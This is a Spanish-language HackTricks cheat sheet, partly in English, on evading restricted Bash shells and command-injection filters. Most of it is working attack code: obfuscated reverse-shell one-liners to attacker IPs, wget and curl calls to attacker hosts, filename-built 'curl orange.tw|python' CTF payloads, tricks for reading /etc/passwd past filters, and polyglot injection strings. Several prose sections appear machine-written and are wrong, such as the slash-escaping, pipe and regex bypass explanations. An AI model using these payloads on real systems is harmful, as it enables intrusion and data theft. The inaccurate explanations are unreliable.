# Saltar Restricciones en Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Saltos Comunes de Limitaciones

### Shell Inverso
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Shell inversa corta

Una shell inversa corta es una técnica utilizada en hacking para establecer una conexión remota a través de una shell inversa en un sistema comprometido. Esto permite al atacante obtener acceso y control total sobre el sistema comprometido.

La siguiente es una implementación básica de una shell inversa corta en Bash:

```bash
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

En esta línea de comando, `10.0.0.1` representa la dirección IP del atacante y `1234` es el puerto utilizado para la conexión. Al ejecutar esta línea de comando en el sistema comprometido, se establecerá una conexión inversa con el atacante.

Es importante tener en cuenta que esta técnica puede ser detectada por sistemas de seguridad y firewalls, por lo que es recomendable utilizar técnicas adicionales para evadir la detección.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Bypass de rutas y palabras prohibidas

En algunas situaciones, es posible que te encuentres con restricciones en el uso de ciertas rutas o palabras en un entorno de Linux. Sin embargo, existen formas de eludir estas restricciones y lograr tus objetivos. A continuación, se presentan algunos comandos útiles para lograrlo:

#### Bypass de rutas

- **cd -**: Este comando te permite regresar al directorio anterior al que te encuentras actualmente. Puedes utilizarlo para evadir restricciones de rutas y acceder a directorios superiores.

- **ln -s /ruta/real /ruta/falsa**: Con este comando, puedes crear un enlace simbólico desde una ruta permitida hacia una ruta no permitida. De esta manera, podrás acceder a la ruta no permitida a través de la ruta permitida.

#### Bypass de palabras prohibidas

- **mv /bin/ls /bin/ls.bak; cp /ruta/alternativa/ls /bin/ls**: Este comando renombra el comando "ls" original a "ls.bak" y luego copia un comando alternativo con un nombre diferente a la ubicación original. De esta manera, puedes utilizar un comando alternativo en lugar del comando prohibido.

- **alias comando='comando_alternativo'**: Puedes utilizar este comando para crear un alias de un comando prohibido y asignarle un comando alternativo permitido. De esta manera, podrás utilizar el comando alternativo en lugar del comando prohibido.

Recuerda que eludir restricciones puede ser considerado una actividad ilegal o no ética, por lo que debes utilizar estos comandos con responsabilidad y solo en entornos autorizados.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Bypassar espacios prohibidos

Sometimes, when trying to execute a command that contains spaces, you may encounter restrictions that prevent the command from running. However, there are ways to bypass these restrictions and execute the command successfully.

In Linux, you can use the backslash (\) character to escape the space character. For example, if you want to execute a command like `ls -l`, which contains a space between `ls` and `-l`, you can bypass the restriction by typing `ls\ -l`.

Another method is to enclose the command within single quotes (''). This tells the shell to treat the entire string as a single argument, ignoring any spaces within it. For example, you can execute the command `ls -l` by typing `'ls -l'`.

Similarly, you can also enclose the command within double quotes (""). This has the same effect as using single quotes. For example, you can execute the command `ls -l` by typing `"ls -l"`.

By using these techniques, you can bypass restrictions on spaces and successfully execute commands that contain spaces.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Bypassar barra invertida y barra diagonal

En algunos casos, es posible que te encuentres con restricciones en el uso de barras invertidas (`\`) y barras diagonales (`/`) al realizar tareas de hacking. Sin embargo, existen formas de eludir estas restricciones y lograr tus objetivos.

#### Bypassar barras invertidas

Si te encuentras con una restricción en el uso de barras invertidas, puedes intentar utilizar la secuencia de escape `\\` para representar una sola barra invertida. Esto engañará al sistema y permitirá que se interprete correctamente.

Por ejemplo, si necesitas ejecutar un comando que contiene una barra invertida, puedes escribirlo de la siguiente manera:

```
comando\\con\\barra\\invertida
```

De esta manera, el sistema interpretará `\\` como una sola barra invertida y ejecutará el comando correctamente.

#### Bypassar barras diagonales

Si te encuentras con una restricción en el uso de barras diagonales, puedes intentar utilizar la secuencia de escape `\/` para representar una sola barra diagonal. Esto permitirá que el sistema interprete correctamente la barra diagonal.

Por ejemplo, si necesitas acceder a un directorio que contiene una barra diagonal en su nombre, puedes escribirlo de la siguiente manera:

```
ruta\/con\/barra\/diagonal
```

De esta manera, el sistema interpretará `\/` como una sola barra diagonal y podrás acceder al directorio correctamente.

Recuerda que estas técnicas pueden variar dependiendo del sistema operativo y la configuración específica. Es importante probar diferentes enfoques y adaptarlos a tu situación particular.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Bypassar tuberías

Las tuberías son una característica poderosa en Linux que permite redirigir la salida de un comando a la entrada de otro. Sin embargo, en algunos casos, es posible que se restrinja el uso de tuberías en un entorno de Bash restringido. Afortunadamente, existen formas de eludir estas restricciones y aprovechar las tuberías para realizar tareas específicas.

Una forma común de eludir las restricciones de tuberías es utilizando el comando `tee`. El comando `tee` lee desde la entrada estándar y escribe tanto en la salida estándar como en uno o más archivos. Al utilizar `tee` en combinación con tuberías, podemos sortear las restricciones y lograr el resultado deseado.

Aquí hay un ejemplo de cómo utilizar `tee` para eludir las restricciones de tuberías:

```bash
echo "Información confidencial" | tee /dev/tty | comando
```

En este ejemplo, la salida del comando `echo` se redirige a `tee`, que a su vez muestra la salida en la terminal (`/dev/tty`) y la pasa como entrada al siguiente comando.

Otra forma de eludir las restricciones de tuberías es utilizando subprocesos. Los subprocesos permiten ejecutar comandos en segundo plano y capturar su salida. Al utilizar subprocesos, podemos sortear las restricciones y lograr el resultado deseado.

Aquí hay un ejemplo de cómo utilizar subprocesos para eludir las restricciones de tuberías:

```bash
(comando1 | comando2) &
```

En este ejemplo, los comandos `comando1` y `comando2` se ejecutan en segundo plano y su salida se pasa de uno a otro a través de la tubería.

Recuerda que eludir las restricciones de tuberías puede ser considerado una actividad maliciosa y puede ser ilegal sin el permiso adecuado. Siempre asegúrate de tener permiso para realizar estas acciones y úsalas con responsabilidad.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Bypass con codificación hexadecimal

Si un sistema tiene restricciones que bloquean ciertos caracteres o comandos en Bash, puedes intentar eludir estas restricciones utilizando la codificación hexadecimal. La codificación hexadecimal representa caracteres utilizando una combinación de números y letras, lo que puede permitirte ejecutar comandos que de otra manera estarían bloqueados.

Aquí hay un ejemplo de cómo usar la codificación hexadecimal para ejecutar un comando:

```bash
$ echo -e "\x6c\x73"
```

En este ejemplo, el comando `echo -e` se utiliza para imprimir los caracteres representados por la codificación hexadecimal `\x6c\x73`. En este caso, `\x6c` representa la letra "l" y `\x73` representa la letra "s". Por lo tanto, el comando `echo -e "\x6c\x73"` imprimirá "ls" en la terminal.

Puedes usar esta técnica para ejecutar cualquier comando que desees, siempre y cuando puedas representar los caracteres en codificación hexadecimal. Sin embargo, ten en cuenta que esta técnica puede no funcionar en todos los sistemas, ya que algunos pueden tener restricciones adicionales que bloquean la codificación hexadecimal.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Bypass IPs

#### Introduction

In some cases, you may encounter restrictions that prevent you from accessing certain IP addresses. However, there are ways to bypass these restrictions and gain access to the blocked IPs. This section will cover some useful Linux commands that can help you achieve this.

#### Method 1: Using a Proxy Server

One common method to bypass IP restrictions is by using a proxy server. A proxy server acts as an intermediary between your device and the target IP address, allowing you to access the blocked IP indirectly. Here's how you can do it:

1. Find a reliable proxy server that is not blocked by the target IP.
2. Configure your system to use the proxy server. You can do this by setting the `http_proxy` and `https_proxy` environment variables or by modifying the network settings in your system preferences.
3. Test the connection by accessing the blocked IP. If everything is set up correctly, you should be able to access the IP without any restrictions.

#### Method 2: Using a VPN

Another effective method to bypass IP restrictions is by using a Virtual Private Network (VPN). A VPN creates a secure and encrypted connection between your device and a remote server, allowing you to access the internet through the server's IP address. Here's how you can use a VPN to bypass IP restrictions:

1. Choose a reputable VPN service provider and sign up for an account.
2. Install the VPN client software on your device and configure it with your account credentials.
3. Connect to a VPN server located in a region where the blocked IP is accessible.
4. Once connected, your internet traffic will be routed through the VPN server, and you should be able to access the blocked IP without any restrictions.

#### Method 3: Using Tor

Tor is a free and open-source software that enables anonymous communication by routing your internet traffic through a network of volunteer-operated servers. By using Tor, you can bypass IP restrictions and access blocked IPs. Here's how you can use Tor:

1. Install the Tor browser on your system.
2. Launch the Tor browser and configure it if necessary.
3. Access the blocked IP by entering its address in the Tor browser's address bar.
4. Tor will route your connection through its network, allowing you to access the blocked IP anonymously.

#### Conclusion

Bypassing IP restrictions can be achieved using various methods such as using a proxy server, a VPN, or Tor. These methods provide you with alternative routes to access blocked IPs and overcome restrictions. However, it's important to note that bypassing IP restrictions may be against the terms of service of certain websites or networks, so use these techniques responsibly and ethically.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Exfiltración de datos basada en el tiempo

La exfiltración de datos basada en el tiempo es una técnica utilizada para extraer información de un sistema comprometido de forma encubierta y gradual, evitando así la detección. En lugar de enviar grandes cantidades de datos de una sola vez, esta técnica divide la información en pequeñas partes y la envía en intervalos de tiempo específicos.

#### Comandos útiles de Linux para eludir restricciones de Bash

A continuación se presentan algunos comandos útiles de Linux que se pueden utilizar para eludir las restricciones de Bash y llevar a cabo la exfiltración de datos basada en el tiempo:

1. **sleep**: El comando `sleep` se utiliza para pausar la ejecución de un script durante un período de tiempo especificado. Puede ser utilizado para establecer intervalos de tiempo entre la exfiltración de datos.

   ```bash
   sleep <segundos>
   ```

2. **date**: El comando `date` muestra la fecha y hora actual del sistema. Puede ser utilizado para registrar el tiempo de exfiltración de datos.

   ```bash
   date
   ```

3. **ping**: El comando `ping` se utiliza para enviar paquetes de datos a una dirección IP específica. Puede ser utilizado para enviar pequeñas partes de datos a un servidor remoto en intervalos de tiempo específicos.

   ```bash
   ping -c 1 <dirección IP>
   ```

4. **curl**: El comando `curl` se utiliza para transferir datos desde o hacia un servidor utilizando varios protocolos. Puede ser utilizado para enviar datos a un servidor remoto en intervalos de tiempo específicos.

   ```bash
   curl -X POST -d "<datos>" <URL>
   ```

Estos comandos pueden ser combinados y utilizados de manera creativa para llevar a cabo la exfiltración de datos basada en el tiempo de manera efectiva y encubierta. Sin embargo, es importante tener en cuenta que el uso de estas técnicas puede ser ilegal y violar la privacidad de otras personas. Se recomienda utilizar estas técnicas solo con fines educativos y éticos, y obtener el permiso adecuado antes de realizar cualquier prueba de penetración.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Obteniendo caracteres de las variables de entorno

En algunas situaciones, es posible que te encuentres con restricciones en el intérprete de comandos Bash que te impidan ejecutar ciertos comandos o acceder a ciertos archivos. Sin embargo, aún puedes obtener información valiosa utilizando los caracteres almacenados en las variables de entorno.

Aquí hay un ejemplo de cómo puedes hacerlo:

```bash
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

En este caso, la variable de entorno `$PATH` contiene múltiples rutas separadas por dos puntos (`:`). Puedes utilizar el comando `cut` para extraer cada una de estas rutas por separado:

```bash
$ echo $PATH | cut -d ":" -f 1
/usr/local/sbin
$ echo $PATH | cut -d ":" -f 2
/usr/local/bin
$ echo $PATH | cut -d ":" -f 3
/usr/sbin
...
```

De esta manera, puedes obtener información sobre las rutas almacenadas en la variable de entorno `$PATH`. Ten en cuenta que este enfoque también se puede aplicar a otras variables de entorno que contengan información relevante.

Recuerda que siempre debes utilizar esta técnica de manera ética y legal, y solo en sistemas en los que tengas permiso para hacerlo.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Exfiltración de datos DNS

Podrías usar **burpcollab** o [**pingb**](http://pingb.in) por ejemplo.

### Funciones internas

En caso de que no puedas ejecutar funciones externas y solo tengas acceso a un **conjunto limitado de funciones internas para obtener RCE**, hay algunos trucos útiles para hacerlo. Por lo general, **no podrás usar todas** las **funciones internas**, por lo que debes **conocer todas tus opciones** para intentar evadir la restricción. Idea de [**devploit**](https://twitter.com/devploit).\
En primer lugar, verifica todas las [**funciones internas del shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** A continuación, aquí tienes algunas **recomendaciones**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Inyección de comandos políglota

La inyección de comandos políglota es una técnica utilizada para evadir las restricciones de Bash y ejecutar comandos arbitrarios en un sistema. Esta técnica se basa en aprovechar las diferencias en la interpretación de comandos entre diferentes lenguajes de programación.

Un ejemplo común de inyección de comandos políglota es el uso de la función `eval()` en lenguajes como PHP o Python. Esta función permite ejecutar código arbitrario como si fuera parte del programa en sí. Al combinar esta función con la sintaxis de comandos de Bash, es posible ejecutar comandos en el sistema objetivo.

Aquí hay un ejemplo de inyección de comandos políglota utilizando la función `eval()` en PHP:

```php
<?php
$payload = "'; echo 'Command executed'; //";
eval($payload);
?>
```

En este ejemplo, el comando `echo 'Command executed'` se ejecutará en el sistema objetivo. El punto y coma al principio del payload se utiliza para cerrar cualquier comando anterior y evitar errores de sintaxis.

Es importante tener en cuenta que la inyección de comandos políglota puede ser peligrosa y debe utilizarse con precaución. Los sistemas deben estar debidamente protegidos para evitar este tipo de ataques.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Bypassar posibles regexes

A veces, al intentar ejecutar comandos en un sistema Linux, puedes encontrarte con restricciones que utilizan expresiones regulares (regexes) para filtrar o bloquear ciertos caracteres o patrones. Sin embargo, existen formas de eludir estas restricciones y ejecutar comandos de todos modos.

Aquí hay algunos métodos comunes para evitar las restricciones basadas en regexes:

1. **Usar caracteres de escape**: Puedes utilizar caracteres de escape, como la barra invertida (\), para evitar que los caracteres sean interpretados como parte de una expresión regular. Por ejemplo, si una restricción bloquea el carácter punto (.), puedes usar el comando `ls \.` para listar los archivos que comienzan con un punto.

2. **Utilizar comillas**: Las comillas simples ('') o dobles ("") pueden ayudarte a evitar que los caracteres sean interpretados como parte de una expresión regular. Por ejemplo, si una restricción bloquea el carácter asterisco (*), puedes usar el comando `ls '*'` para listar los archivos que contienen un asterisco en su nombre.

3. **Cambiar el orden de los caracteres**: A veces, cambiar el orden de los caracteres puede evitar que sean detectados por una expresión regular. Por ejemplo, si una restricción bloquea el carácter punto y coma (;), puedes intentar ejecutar el comando `ls ;echo "Hello"` para listar los archivos y mostrar el mensaje "Hello" al mismo tiempo.

Recuerda que eludir restricciones basadas en regexes puede ser considerado un comportamiento no autorizado y puede tener consecuencias legales. Solo debes utilizar estos métodos con fines educativos y éticos, y siempre obtener el permiso adecuado antes de realizar cualquier prueba de penetración.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator es una herramienta que se utiliza para ofuscar scripts de Bash con el objetivo de evadir restricciones y evitar la detección. Esta herramienta reescribe el código de Bash de manera que sea más difícil de entender y analizar para los sistemas de seguridad.

El Bashfuscator utiliza técnicas como la ofuscación de variables, la mezcla de caracteres y la inserción de código adicional para dificultar la comprensión del script. Esto puede ayudar a evitar la detección de patrones y a eludir las restricciones impuestas por los sistemas de seguridad.

Es importante tener en cuenta que el Bashfuscator no garantiza una protección completa contra la detección y el análisis de scripts de Bash. Sin embargo, puede ser una herramienta útil en ciertos escenarios donde se requiere evadir restricciones y mantener la confidencialidad de un script.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE con 5 caracteres

En algunos casos, cuando se enfrenta a restricciones de Bash, puede ser necesario encontrar una forma de ejecutar comandos remotos (RCE) utilizando solo 5 caracteres. Aquí hay una técnica que puede ayudar:

```bash
$ echo $0
bash
$ exec 5<>/dev/tcp/127.0.0.1/1337
$ cat <&5 | while read line; do $line 2>&5 >&5; done
```

Este código establece una conexión TCP con la dirección IP `127.0.0.1` en el puerto `1337`. Luego, redirige la entrada y salida estándar del descriptor de archivo 5 al comando `cat`, que lee los comandos enviados a través de la conexión TCP. Cada línea leída se ejecuta utilizando la sintaxis `$line 2>&5 >&5`, lo que permite la ejecución remota de comandos.

Para utilizar esta técnica, simplemente reemplace la dirección IP y el puerto con los correspondientes a su caso de uso. Tenga en cuenta que esta técnica puede no funcionar en todas las configuraciones y puede estar sujeta a restricciones adicionales.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE con 4 caracteres

En algunos casos, cuando se enfrenta a restricciones de Bash, puede ser útil conocer comandos que se pueden ejecutar con solo 4 caracteres. Estos comandos pueden ser útiles para lograr la ejecución remota de código (RCE) en situaciones en las que se restringe el uso de ciertos caracteres o comandos.

A continuación se muestra una lista de comandos de 4 caracteres que se pueden utilizar para el RCE:

- `echo`: Imprime un mensaje en la salida estándar.
- `true`: Devuelve un estado de éxito.
- `false`: Devuelve un estado de error.
- `read`: Lee una línea de entrada y la asigna a una variable.
- `exec`: Ejecuta un comando en el mismo proceso.
- `kill`: Envía una señal a un proceso.
- `test`: Evalúa una expresión y devuelve un estado de éxito o error.
- `time`: Mide el tiempo de ejecución de un comando.
- `wait`: Espera a que finalicen los procesos secundarios.
- `trap`: Captura y maneja señales.

Estos comandos pueden ser útiles para sortear restricciones y lograr la ejecución de comandos en situaciones en las que se limita el uso de caracteres o comandos más largos. Sin embargo, es importante tener en cuenta que el uso de estos comandos puede depender del contexto y de las restricciones específicas del entorno en el que se está trabajando.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Bypass de Restricciones de Solo Lectura/Noexec/Distroless

Si te encuentras dentro de un sistema de archivos con protecciones de solo lectura y noexec, o incluso en un contenedor distroless, aún hay formas de ejecutar binarios arbitrarios, ¡incluso una shell!:

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Bypass de Chroot y otras Jaulas

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Referencias y Más

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
